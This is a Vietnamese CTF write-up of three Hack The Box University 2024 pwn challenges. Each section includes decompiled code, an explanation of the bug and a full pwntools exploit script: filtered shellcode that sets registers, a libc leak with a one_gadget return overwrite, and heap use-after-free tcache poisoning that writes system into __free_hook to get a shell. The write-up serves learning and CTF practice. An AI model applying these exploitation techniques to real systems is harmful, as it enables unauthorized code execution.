--- 
title: HTB-University-2024
date: 2025-03-06 00:00:00 +0800
categories: [writeup]
tags: [pwn,heap]
author: "kuvee"
layout: post
---

## recontruction


- ta cần nhập fix để đi dc vào hàm ```check```


```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int buf; // [rsp+3h] [rbp-Dh] BYREF
  char v4; // [rsp+7h] [rbp-9h]
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  banner(argc, argv, envp);
  buf = 0;
  v4 = 0;
  printstr("\n[*] Initializing components...\n");
  sleep(1u);
  puts("\x1B[1;31m");
  printstr("[-] Error: Misaligned components!\n");
  puts("\x1B[1;34m");
  printstr("[*] If you intend to fix them, type \"fix\": ");
  read(0, &buf, 4uLL);
  if ( !strncmp((const char *)&buf, "fix", 3uLL) )
  {
    puts("\x1B[1;33m");
    printstr("[!] Carefully place all the components: ");
    if ( (unsigned __int8)check() )
      read_flag();
    exit(1312);
  }
  puts("\x1B[1;31m");
  printstr("[-] Mission failed!\n\n");
  exit(1312);
}
```
- check : 

dùng mmap để tạo 1 vùng nhớ mới , tiếp theo read 60 byte vào ```buf``` và sao chép dữ liệu từ ```buf``` sang địa chỉ vừa được mmap tạo



```c

__int64 check()
{
  __int64 v0; // rbx
  __int64 v1; // rbx
  __int64 v2; // rbx
  __int64 v3; // rbx
  __int64 v4; // rbx
  __int64 v5; // rax
  unsigned __int8 i; // [rsp+Fh] [rbp-71h]
  _QWORD *addr; // [rsp+10h] [rbp-70h]
  __int64 buf; // [rsp+20h] [rbp-60h] BYREF
  __int64 v10; // [rsp+28h] [rbp-58h]
  __int64 v11; // [rsp+30h] [rbp-50h]
  __int64 v12; // [rsp+38h] [rbp-48h]
  __int64 v13; // [rsp+40h] [rbp-40h]
  _BYTE v14[13]; // [rsp+48h] [rbp-38h] BYREF
  __int64 v15; // [rsp+55h] [rbp-2Bh]
  unsigned __int64 v16; // [rsp+68h] [rbp-18h]

  v16 = __readfsqword(0x28u);
  addr = mmap(0LL, 0x3CuLL, 7, 34, -1, 0LL);
  if ( addr == (_QWORD *)-1LL )
  {
    perror("mmap");
    exit(1);
  }
  buf = 0LL;
  v10 = 0LL;
  v11 = 0LL;
  v12 = 0LL;
  v13 = 0LL;
  memset(v14, 0, sizeof(v14));
  v15 = 0LL;
  read(0, &buf, 0x3CuLL);
  v0 = v10;
  *addr = buf;
  addr[1] = v0;
  v1 = v12;
  addr[2] = v11;
  addr[3] = v1;
  v2 = *(_QWORD *)v14;
  addr[4] = v13;
  addr[5] = v2;
  v3 = v15;
  *(_QWORD *)((char *)addr + 45) = *(_QWORD *)&v14[5];
  *(_QWORD *)((char *)addr + 53) = v3;
  if ( !(unsigned int)validate_payload(addr, 59LL) )
  {
    error("Invalid payload! Execution denied.\n");
    exit(1);
  }
  ((void (*)(void))addr)();
  munmap(addr, 0x3CuLL);
  for ( i = 0; i <= 6u; ++i )
  {
    if ( regs((&::buf)[i]) != values[i] )
    {
      v4 = values[i];
      v5 = regs((&::buf)[i]);
      printf(
        "%s\n[-] Value of [ %s$%s%s ]: [ %s0x%lx%s ]%s\n\n[+] Correct value: [ %s0x%lx%s ]\n\n",
        "\x1B[1;31m",
        "\x1B[1;35m",
        (&::buf)[i],
        "\x1B[1;31m",
        "\x1B[1;35m",
        v5,
        "\x1B[1;31m",
        "\x1B[1;32m",
        "\x1B[1;33m",
        v4,
        "\x1B[1;32m");
      return 0LL;
    }
  }
  return 1LL;
}
```


- validate_payload : 

hàm này sẽ check xem từng byte shellcode của ta có hợp lệ không

```c
__int64 __fastcall validate_payload(__int64 shellcode, unsigned __int64 lenght)
{
  int v3; // [rsp+14h] [rbp-1Ch]
  unsigned __int64 i; // [rsp+18h] [rbp-18h]
  unsigned __int64 j; // [rsp+20h] [rbp-10h]

  for ( i = 0LL; i < lenght; ++i )
  {
    v3 = 0;
    for ( j = 0LL; j <= 0x11; ++j )
    {
      if ( *(_BYTE *)(shellcode + i) == allowed_bytes[j] )
      {
        v3 = 1;
        break;
      }
    }
    if ( !v3 )
    {
      printf(
        "%s\n[-] Invalid byte detected: 0x%x at position %zu\n",
        "\x1B[1;31m",
        *(unsigned __int8 *)(shellcode + i),
        i);
      return 0LL;
    }
  }
  return 1LL;
}
```

đây sẽ là những byte cho phép 

```cs
 0x49, 0xC7, 0xB9, 0xC0, 0xDE, 0x37, 0x13, 0xC4, 0xC6, 0xEF, 
  0xBE, 0xAD, 0xCA, 0xFE, 0xC3, 0x00, 0xBA, 0xBD
```

- nếu thõa tất cả các điều kiện thì thực thi shellcode và dùng ```mun_map``` để xóa vùng nhớ đó đi 
```cs
((void (*)(void))addr)();
  munmap(addr, 0x3CuLL);
``` 

- tiếp theo nữa là 1 lệnh check 

```c
for ( i = 0; i <= 6u; ++i )
  {
    if ( regs((&::buf)[i]) != values[i] )
    {
      v4 = values[i];
      v5 = regs((&::buf)[i]);
      printf(
        "%s\n[-] Value of [ %s$%s%s ]: [ %s0x%lx%s ]%s\n\n[+] Correct value: [ %s0x%lx%s ]\n\n",
        "\x1B[1;31m",
        "\x1B[1;35m",
        (&::buf)[i],
        "\x1B[1;31m",
        "\x1B[1;35m",
        v5,
        "\x1B[1;31m",
        "\x1B[1;32m",
        "\x1B[1;33m",
        v4,
        "\x1B[1;32m");
      return 0LL;
    }
  }
```

- regs : nó check xem các  kí tự này có trong dữ liệu của ta không

```c
__int64 __fastcall regs(const char *a1)
{
  __int64 v1; // r12
  __int64 v2; // r13
  __int64 v3; // r14
  __int64 v4; // r15
  __int64 v5; // r8
  __int64 v6; // r9
  __int64 v7; // r10
  __int64 v9; // [rsp+10h] [rbp-10h]

  v9 = 0LL;
  if ( !strcmp(a1, "r8") )
    return v5;
  if ( !strcmp(a1, "r9") )
    return v6;
  if ( !strcmp(a1, "r10") )
    return v7;
  if ( !strcmp(a1, "r12") )
    return v1;
  if ( !strcmp(a1, "r13") )
    return v2;
  if ( !strcmp(a1, "r14") )
    return v3;
  if ( !strcmp(a1, "r15") )
    return v4;
  printf("Unknown register: %s\n", a1);
  return v9;
}
```

- đây sẽ là những giá trị trong ```value```  : 

```c
0x1337C0DE , 0xDEADBEEF  , 0XDEAD1337 ,
0X1337CAFE , 0XBEEFCODE , 0X13371337 , 0X1337DEAD
```

- vậy ta có thể hình dung bài này như sau : 

ta sẽ được nhập 1 shellcode và filter các bytes , nếu các byte thõa thì tiếp tục check các giá trị r8,r9,r10 tương ứng có bằng với các giá trị trong value không

- cách đơn giản nhất là dùng lệnh ```mov``` để gán gía trị cho nó , tuy nhiên ta sẽ check xem nó có bị filter không bằng web này : 

https://defuse.ca/online-x86-assembler.htm

- các byte tương ứng như sau 

![image](https://hackmd.io/_uploads/SknoLkpvkx.png)

- các byte được cho phép , ta thấy nó khớp với lệnh ở trên 

```c
 0x49, 0xC7, 0xB9, 0xC0, 0xDE, 0x37, 0x13, 0xC4, 0xC6, 0xEF, 
  0xBE, 0xAD, 0xCA, 0xFE, 0xC3, 0x00, 0xBA, 0xBD,
```

- may mắn là các byte này không filter opcode ```mov``` nên ta dễ dàng :v



```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./reconstruction_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

context.arch = 'amd64'
p = process()
gdb.attach(p,gdbscript='''
           brva 0x00000000000019D9
           ''')

input()
shellcode = asm('''
        mov r8,0x1337c0de
        mov r9,0xDEADBEEF
        mov r10,0xdead1337
        mov r12,0x1337cafe
        mov r13,0xBEEFC0DE
        mov r14,0x13371337
        mov r15,0x1337dead
        ret
                ''')
p.sendlineafter(b': ',b'fix')
test = b"\x49\xC7\xC0\xDE\xC0\x37\x13\x49\xB9\xEF\xBE\xAD\xDE\x00\x00\x00\x00\x49\xBA\x37\x13\xAD\xDE\x00\x00\x00\x00\x49\xC7\xC4\xFE\xCA\x37\x13\x49\xBD\xDE\xC0\xEF\xBE\x00\x00\x00\x00\x49\xC7\xC6\x37\x13\x37\x13\x49\xC7\xC7\xAD\xDE\x37\x13\xC3"
p.sendafter(b'components: ',shellcode)


p.interactive()
```



---------------

# Recruitment

- vì reverse C++ là 1 phạm trù gì đó nên mình chạy file trước :v , ở đây ta thấy option1 được nhập ```name``` , ```class``` , ```age```

![image](https://hackmd.io/_uploads/Sy7HKBavJx.png)

- ta chỉ cần chú ý đoạn nhập thôi , ```Name``` và ```Class``` sẽ dùng ```cin``` để input , còn ```age``` thì dùng ```read``` để input và sau đó nó sẽ được sao chép và in ra

```c
char **create_profile(void)
{
  __int64 v0; // rax
  __int64 v1; // rax
  __int64 v2; // rax
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v10; // rax
  __int64 v11; // rax
  __int64 v12; // rax
  __int64 v13; // rax
  const char *v14; // rsi
  const char *v15; // rax
  char **v16; // rbx
  char buf[256]; // [rsp+0h] [rbp-160h] BYREF
  _BYTE v19[32]; // [rsp+100h] [rbp-60h] BYREF
  _BYTE v20[32]; // [rsp+120h] [rbp-40h] BYREF
  char **v21; // [rsp+140h] [rbp-20h]
  int i; // [rsp+14Ch] [rbp-14h]

  v21 = (char **)operator new[](0x18uLL);
  for ( i = 0; i <= 2; ++i )
    v21[i] = (char *)operator new[](0x64uLL);
  std::string::basic_string(v20);
  std::string::basic_string(v19);
  fflush(_bss_start);
  std::operator<<<std::char_traits<char>>(
    &std::cout,
    "\n[*] You need to enter your Name, Class, and Age.\n\n[+] Name:  ");
  std::getline<char,std::char_traits<char>,std::allocator<char>>(&std::cin, v20);
  std::operator<<<std::char_traits<char>>(&std::cout, "[+] Class: ");
  std::getline<char,std::char_traits<char>,std::allocator<char>>(&std::cin, v19);
  std::operator<<<std::char_traits<char>>(&std::cout, "[+] Age:   ");
  read(0, buf, 0x20uLL);
  v0 = std::operator<<<std::char_traits<char>>(&std::cout, &unk_404010);
  v1 = std::operator<<<std::char_traits<char>>(v0, "\x1B[1;35m");
  v2 = std::operator<<<char>(v1, v20);
  v3 = std::operator<<<std::char_traits<char>>(v2, "\x1B[1;34m");
  v4 = std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
  v5 = std::operator<<<std::char_traits<char>>(v4, "[*] Class: ");
  v6 = std::operator<<<std::char_traits<char>>(v5, "\x1B[1;33m");
  v7 = std::operator<<<char>(v6, v19);
  v8 = std::operator<<<std::char_traits<char>>(v7, "\x1B[1;34m");
  v9 = std::ostream::operator<<(v8, &std::endl<char,std::char_traits<char>>);
  v10 = std::operator<<<std::char_traits<char>>(v9, "[*] Age:   ");
  v11 = std::operator<<<std::char_traits<char>>(v10, buf);
  v12 = std::ostream::operator<<(v11, &std::endl<char,std::char_traits<char>>);
  v13 = std::ostream::operator<<(v12, &std::endl<char,std::char_traits<char>>);
  std::operator<<<std::char_traits<char>>(v13, &unk_404128);
  buf[strcspn(buf, "\n")] = 0;
  v14 = (const char *)std::string::c_str(v20);
  strcpy(*v21, v14);
  v15 = (const char *)std::string::c_str(v19);
  strcpy(v21[1], v15);
  strcpy(v21[2], buf);
  flag = 1;
  v16 = v21;
  std::string::~string();
  std::string::~string();
  return v16;
}
```


- journey : ở cuối hàm này ta thấy ngay 1 bug ```BOF``` , tuy nhiên như ta thấy ở đây ta chỉ ghi đè được 7 bytes

```cpp
__int64 __fastcall journey(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // rax
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  char v8[8]; // [rsp+10h] [rbp-20h] BYREF
  __int64 v9; // [rsp+18h] [rbp-18h]
  __int64 v10; // [rsp+20h] [rbp-10h]
  __int64 v11; // [rsp+28h] [rbp-8h]

  flag = 3;
  v1 = std::operator<<<std::char_traits<char>>(
         &std::cout,
         "\x1B[1;32m\n[!] The fate of the Frontier Cluster lies on loyal and brave Space Cowpokes like you [ ");
  v2 = std::operator<<<std::char_traits<char>>(v1, "\x1B[1;35m");
  v3 = std::operator<<<char>(v2, a1);
  v4 = std::operator<<<std::char_traits<char>>(v3, "\x1B[1;32m");
  v5 = std::operator<<<std::char_traits<char>>(v4, " ].");
  v6 = std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
  std::operator<<<std::char_traits<char>>(
    v6,
    "    We need you to tell us a bit about you so that we can assign to you your first mission: ");
  *(_QWORD *)v8 = 0LL;
  v9 = 0LL;
  v10 = 0LL;
  v11 = 0LL;
  return std::istream::getline((std::istream *)&std::cin, v8, 47LL);
}
```

![image](https://hackmd.io/_uploads/rkCTkUawke.png)

- vậy ta sẽ sử dụng one_gadget hoặc là 1 gadget nào đó giúp giảm stack đi để stack pivot vào payload của ta , Tuy nhiên thì bài này không có thằng nào nên ta phải dùng ```one_gadget``` , vậy ta cũng phải leak libc , cách leak thì có lẽ là dùng hàm in  , và lúc này ta lại nhớ đến hàm read mà sử dụng để input vô ```age```

- vậy ở đây ta cần input 8 bytes thì khi in nó sẽ nối địa chỉ kế tiếp 

![image](https://hackmd.io/_uploads/HJOUZ86wJg.png)





- sau 1 hồi thử tìm các gadget xem có pivot được không thì mình cũng không thấy , vậy chỉ dùng one_gadget được thôi


```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./recruitment_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()
#gdb.attach(p,gdbscript='''
#           b*0x00000000004031B2
#           b*0x0000000000402A7B
#           ''')

input()
p.sendline(b'1')
p.sendlineafter(b'Name:  ',b'loideptrai')
p.sendlineafter(b'Class: ',b'cc')
p.sendafter(b'Age: ',b'loidep12')

p.sendline(b'2')
p.recvuntil(b'loidep12')
leak = u64(p.recv(6).ljust(8,b'\x00'))
log.info(f'leak: {hex(leak)}')
libc.address = leak - 0x93bca
log.info(f'libc: {hex(libc.address)}')

"""
0x583dc posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x68 is writable
  rsp & 0xf == 0
  rax == NULL || {"sh", rax, rip+0x17302e, r12, ...} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0x583e3 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x68 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, rip+0x17302e, r12, ...} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0xef4ce execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
  [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp
"""

p.sendline(b'3')
input()
p.sendlineafter(b'mission: ',b'a'*0x28 + p64(libc.address+0x583e3))
p.interactive()
```


![image](https://hackmd.io/_uploads/Hyldul0vye.png)


---------------------

## prison_break


checksec

![image](https://hackmd.io/_uploads/BkpLilAv1g.png)

- bài này sẽ có 4 option chính 

![image](https://hackmd.io/_uploads/S107nlRPJx.png)

- create : đầu tiên chương trình nhập vào 1 idx và check xem có chunk nào đã được khởi tạo chưa , tiếp theo nó malloc(0x18) , chunk này sẽ là chunk giữ địa chỉ và size của chunk chính của ta

```c
unsigned __int64 create()
{
  int v0; // eax
  void *ptr2; // rax
  signed int idx; // [rsp+Ch] [rbp-14h] BYREF
  char *ptr1; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  puts("Journal index:");
  idx = 0;
  __isoc99_scanf("%d", &idx);
  if ( (unsigned int)idx < 10 )
  {
    if ( Chunks[idx] && *(_BYTE *)(Chunks[idx] + 16LL) )
    {
      error("Journal index occupied");
    }
    else
    {
      ptr1 = (char *)malloc(0x18uLL);
      v0 = day++;
      *((_DWORD *)ptr1 + 5) = v0;
      puts("Journal size:");
      __isoc99_scanf("%lu", ptr1 + 8);
      ptr2 = malloc(*((_QWORD *)ptr1 + 1));
      *(_QWORD *)ptr1 = ptr2;
      ptr1[16] = 1;
      if ( !*(_QWORD *)ptr1 )
      {
        error("Could not allocate space for journal");
        exit(-1);
      }
      puts("Enter your data:");
      read(0, *(void **)ptr1, *((_QWORD *)ptr1 + 1));
      Chunks[idx] = ptr1;
      putchar(10);
    }
  }
  else
  {
    error("Journal index out of range");
  }
  return __readfsqword(0x28u) ^ v5;
}
```

- ta có thể thấy như sau: 

![image](https://hackmd.io/_uploads/BkY7--0Dyl.png)

- delete : có 1 bug UAF rất rõ ràng , ở đây nó chỉ gán byte_null cho chunk[16] chứ không xóa con trỏ 

```c
unsigned __int64 delete()
{
  unsigned int idx; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Journal index:");
  idx = 0;
  __isoc99_scanf("%d", &idx);
  if ( idx < 0xA )
  {
    if ( Chunks[idx] && *(_BYTE *)(Chunks[idx] + 16LL) )
    {
      *(_BYTE *)(Chunks[idx] + 16LL) = 0;
      free(*(void **)Chunks[idx]);
    }
    else
    {
      error("Journal is not inuse");
    }
  }
  else
  {
    error("Journal index out of range");
  }
  return __readfsqword(0x28u) ^ v2;
}
```

- view : check các kiểu xong rồi in ra 

```c
unsigned __int64 view()
{
  unsigned int idx; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Journal index:");
  idx = 0;
  __isoc99_scanf("%d", &idx);
  if ( idx < 0xA )
  {
    if ( !Chunks[idx] )
      error("Journal index does not exist");
    if ( *(_BYTE *)(Chunks[idx] + 16LL) != 1 )
      error("Journal is not inuse");
    else
      printf(
        "Day #%s%u%s entry:\n%s\n",
        "\x1B[1;31m",
        *(_DWORD *)(Chunks[idx] + 20LL),
        "\x1B[1;97m",
        *(const char **)Chunks[idx]);
  }
  else
  {
    error("Journal index out of range");
  }
  return __readfsqword(0x28u) ^ v2;
}
```

    - copy_paste : hàm này là 1 hàm coppy dữ liệu từ chunk[v2] vào chunk[idx] với v2 và idx đều do ta nhập vào

```c
unsigned __int64 copy_paste()
{
  unsigned int idx; // [rsp+0h] [rbp-10h] BYREF
  unsigned int v2; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  idx = 0;
  v2 = 0;
  puts("Copy index:");
  __isoc99_scanf("%d", &idx);
  if ( idx >= 0xA || (puts("Paste index:"), __isoc99_scanf("%d", &v2), v2 >= 0xA) )
  {
    error("Index out of range");
  }
  else if ( Chunks[idx] && Chunks[v2] )
  {
    if ( *(Chunks[idx] + 16LL) || *(Chunks[v2] + 16LL) )
    {
      if ( *(Chunks[idx] + 8LL) <= *(Chunks[v2] + 8LL) )
      {
        *(Chunks[v2] + 20LL) = day;
        memcpy(*Chunks[v2], *Chunks[idx], *(Chunks[idx] + 8LL));
        puts("Copy successfull!\n");
      }
      else
      {
        error("Copy index size cannot be larger than the paste index size");
      }
    }
    else
    {
      error("Journal index not in use");
    }
  }
  else
  {
    error("Invalid copy/paste index");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

## EXPLOIT

- ở những bài heap thì sẽ thường là add, delete , view các kiểu tuy nhiên bài này có thêm hàm coppy , vì vậy ta cần xem xét kĩ nó 


- ta có thể thấy đầu tiên nó sẽ check idx , tiếp sau là check chunk nó có NULL không tiếp theo sau là vì nó sẽ sao chép dữ liệu từ chunk[idx] sang chunk[v2] nên nó sẽ check xem size chunk[idx] có bé hơn chunk[v2] không , thõa hết thì nó sẽ sao chép với size là size của chunk[idx]


![image](https://hackmd.io/_uploads/BJHXD-RwJx.png)

- truớc hết các bài heap thì có lẽ là cần leak libc trước  , ở đây có ```UAF``` và không giới hạn size -> ta có thể malloc 1 chunk và free nó vào ```unsorted_bin``` , tuy nhiên ở hàm in thì ta lại gặp 1 vấn đề , ta có thể vượt qua được chunk[idx] vấn đề ở đây là nó sẽ check thêm 1 byte cờ nữa 

![image](https://hackmd.io/_uploads/r15MKZCvyg.png)


- tuy nhiên vấn đề này có thể được xem xét như sau , ở đây thay vì dùng && thì nó lại dùng ```or``` có nghĩa là ta có thể coppy dữ liệu từ 1 chunk chưa được giải phóng sang chunk đã được giải phóng hoặc ngược lại

```
    if ( *(_BYTE *)(*((_QWORD *)&Chunks + v1) + 16LL) || *(_BYTE *)(*((_QWORD *)&Chunks + v2) + 16LL) )
```

- vậy ta sẽ kết hợp các dữ liệu lại như sau , đầu tiên ta sẽ leak libc bằng cách filter full ```tcachebin``` , free lần tiếp theo nó sẽ đi vào ```unsorted_bin``` , tiếp theo đó lúc này ta không thể xem dữ liệu của thằng đã free , vậy ta sẽ coppy nó sang 1 chunk chưa được free khác  và đọc nó 

- có libc rồi thì bài này xài libc 2.27 -> có thể dùng hook  , ở đây ta sẽ tấn công ```free_hook```

![image](https://hackmd.io/_uploads/HJFfKuy_1g.png)

- vì phiên bản libc khá thấp nên ta có thể dùng ```tcache_dup``` thoải mái , ta sẽ phân bổ lại 1 chunk và điền content nó là __free_hook , coppy content chunk này vào fd của thằng entry_tcache , sau đó phân bổ 1 khối rác , khối tiếp theo ta sẽ được ghi dữ liệu vào ```hook```

![image](https://hackmd.io/_uploads/H1VEquJ_Je.png)

- overwrite fd của entry_tcache 

![image](https://hackmd.io/_uploads/Hk3Bc_kdJg.png)

- kết quả : 

![image](https://hackmd.io/_uploads/ByRvcd1dkx.png)

- ghi system vào ```free_hook``` thành công

![image](https://hackmd.io/_uploads/S1at5O1dkg.png)

script 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./prison_break_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

p = process()

def add(idx,size,data):
    p.sendlineafter(b'# ',b'1')
    p.sendlineafter(b'Journal index:\n',f'{idx}'.encode())
    p.sendlineafter(b'size:\n',f'{size}'.encode())
    p.sendafter(b'data:\n',data)

def delete(idx):
    p.sendlineafter(b'# ',b'2')
    p.sendlineafter(b'index:\n',f'{idx}'.encode())
def view(idx):
    p.sendlineafter(b'# ',b'3')
    p.sendlineafter(b'index:\n',f'{idx}'.encode())
def coppy(idx1,idx2):
    p.sendlineafter(b'# ',b'4')
    p.sendlineafter(b'Copy index:\n',f'{idx1}'.encode())
    p.sendlineafter(b'Paste index:\n',f'{idx2}'.encode())


for i in range(10): add(i,0x80,b'a')
for i in range(1,9): delete(i)
coppy(8,0)
view(0)

p.recvline()
libc.address = u64(p.recv(6).ljust(8,b'\x00')) - 0x3ebca0
log.info(f'libc: {hex(libc.address)}')
log.info(f'system: {hex(libc.sym.system)}')
log.info(f'free_hook: {hex(libc.sym.__free_hook)}')

input()
add(1,0x70,p64(libc.sym.__free_hook))
coppy(1,7)
add(2,0x80,b'/bin/sh\x00')
add(3,0x80,p64(libc.sym.system))
delete(2)





p.interactive()
```